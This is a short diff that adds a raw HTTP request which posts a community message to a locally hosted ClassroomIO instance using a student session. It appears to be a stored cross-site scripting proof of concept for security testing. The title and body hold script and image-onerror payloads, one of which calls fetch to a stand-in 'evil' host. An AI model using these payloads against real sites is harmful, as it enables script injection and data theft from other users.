@@ -1,0 +1,15 @@
+POST /community HTTP/1.1
+Host: localhost:21527
+Content-Type: application/json
+cio-org-id: 48bbdff8-2ad5-46a3-a259-2ca3d52677dd
+Cookie: classroomio.session_token=<STUDENT session>
+
+{
+  "slug": "xss-post_4474a9c4",
+  "title": "<img src=x onerror=alert(\"xss_61937199\")>",
+  "body": "<script>alert(\"xss_61937199\")</script><img src=x onerror=\"fetch('//evil/xss_61937199')\"><b>xss_61937199</b>",
+  "courseId": "41b41d7f-9a7f-43b0-8ff6-8185d90d5b04",
+  "organizationId": "48bbdff8-2ad5-46a3-a259-2ca3d52677dd",
+  "authorProfileId": "76b1e0ac-60a3-4e7c-9846-ad1aeaf98d40",
+  "votes": 0
+}
